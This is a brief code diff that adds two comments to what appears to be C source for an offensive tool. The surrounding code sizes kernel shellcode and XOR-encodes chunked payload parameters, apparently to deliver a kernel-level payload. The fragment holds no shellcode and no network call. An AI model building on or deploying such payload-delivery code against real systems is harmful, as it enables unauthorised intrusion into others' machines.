@@ -614,6 +614,7 @@ int main(int argc, char* argv[])
 	}
 
 	//int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
+	//remove the NULL terminator from the count
 	//kernel_shellcode_size -= 1;
 	int kernel_shellcode_size = 6144;
 	printf("Kernel shellcode size:  %d\n", kernel_shellcode_size);
@@ -675,6 +676,7 @@ int main(int argc, char* argv[])
 		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
 		memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
+		//XOR the parameters with the XOR key
 		for (i = 0; i < 13; i++)
 		{
 			Parametersbuffer[i] ^= byte_xor_key[i % 4];
